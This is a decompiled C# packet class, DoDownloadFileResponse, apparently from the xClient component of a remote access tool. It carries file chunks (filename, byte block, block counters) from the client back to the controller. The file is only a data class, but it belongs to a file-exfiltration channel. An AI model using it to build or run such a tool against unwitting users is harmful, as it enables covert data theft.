using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
	// Token: 0x02000083 RID: 131
	[Serializable]
	public class DoDownloadFileResponse : IPacket
	{
		// Token: 0x17000072 RID: 114
		// (get) Token: 0x06000359 RID: 857 RVA: 0x00003A03 File Offset: 0x00001C03
		// (set) Token: 0x0600035A RID: 858 RVA: 0x00003A0B File Offset: 0x00001C0B
		public int ID { get; set; }

		// Token: 0x17000073 RID: 115
		// (get) Token: 0x0600035B RID: 859 RVA: 0x00003A14 File Offset: 0x00001C14
		// (set) Token: 0x0600035C RID: 860 RVA: 0x00003A1C File Offset: 0x00001C1C
		public string Filename { get; set; }

		// Token: 0x17000074 RID: 116
		// (get) Token: 0x0600035D RID: 861 RVA: 0x00003A25 File Offset: 0x00001C25
		// (set) Token: 0x0600035E RID: 862 RVA: 0x00003A2D File Offset: 0x00001C2D
		public byte[] Block { get; set; }

		// Token: 0x17000075 RID: 117
		// (get) Token: 0x0600035F RID: 863 RVA: 0x00003A36 File Offset: 0x00001C36
		// (set) Token: 0x06000360 RID: 864 RVA: 0x00003A3E File Offset: 0x00001C3E
		public int MaxBlocks { get; set; }

		// Token: 0x17000076 RID: 118
		// (get) Token: 0x06000361 RID: 865 RVA: 0x00003A47 File Offset: 0x00001C47
		// (set) Token: 0x06000362 RID: 866 RVA: 0x00003A4F File Offset: 0x00001C4F
		public int CurrentBlock { get; set; }

		// Token: 0x17000077 RID: 119
		// (get) Token: 0x06000363 RID: 867 RVA: 0x00003A58 File Offset: 0x00001C58
		// (set) Token: 0x06000364 RID: 868 RVA: 0x00003A60 File Offset: 0x00001C60
		public string CustomMessage { get; set; }

		// Token: 0x06000365 RID: 869 RVA: 0x000021D4 File Offset: 0x000003D4
		public DoDownloadFileResponse()
		{
		}

		// Token: 0x06000366 RID: 870 RVA: 0x00003A69 File Offset: 0x00001C69
		public DoDownloadFileResponse(int id, string filename, byte[] block, int maxblocks, int currentblock, string custommessage)
		{
			this.ID = id;
			this.Filename = filename;
			this.Block = block;
			this.MaxBlocks = maxblocks;
			this.CurrentBlock = currentblock;
			this.CustomMessage = custommessage;
		}

		// Token: 0x06000367 RID: 871 RVA: 0x00003A9E File Offset: 0x00001C9E
		public void Execute(Client client)
		{
			client.SendBlocking<DoDownloadFileResponse>(this);
		}
	}
}
